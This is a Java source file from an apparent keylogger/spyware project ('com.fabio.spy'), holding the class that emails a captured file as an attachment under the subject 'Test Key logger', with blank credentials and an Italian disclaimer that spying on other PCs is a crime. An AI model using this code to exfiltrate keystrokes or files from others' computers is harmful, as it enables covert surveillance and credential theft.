package com.fabio.spy.mail;
/*
 * Author Fabio Petricola 
 * */

import java.io.File;
import java.util.Date;

import javax.mail.Address;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import com.fabio.spy.config.ConfigProperty;



public class SendMail implements SendEmailInterface{
	
	private Message message;
	
	private MimeBodyPart bodyPart;
	
	InternetAddress[] lista;
	
	public void sendMailConAttachment(File file) throws Exception {
		ConfigProperty configProperty=ConfigProperty.getInstance();
		 Authenticator auth = new Authenticator() {
		        public PasswordAuthentication getPasswordAuthentication() {
		            return new PasswordAuthentication("","");
		        }
		    };
		Session session=Session.getDefaultInstance(configProperty.getProperties(), auth);
		message=new MimeMessage(session);
		message.setText("Questo è solo un test, usare per controllare altri pc questo applicativo è un reato!!!");
		message.setFrom(new InternetAddress("mittente"));
	    message.setSubject("***Test Key logger***");
	    InternetAddress[] destinatario = { new InternetAddress("destinatario")};
	    message.setRecipients(Message.RecipientType.TO,destinatario);
	    message.setSentDate(new Date());
	    MimeMultipart multiPart=new MimeMultipart();
	    bodyPart = new MimeBodyPart();
	    bodyPart.attachFile(file);
	    multiPart.addBodyPart(bodyPart);
	    message.setContent(multiPart);
	    
	    Transport.send(message);
	}
	
	
	
}
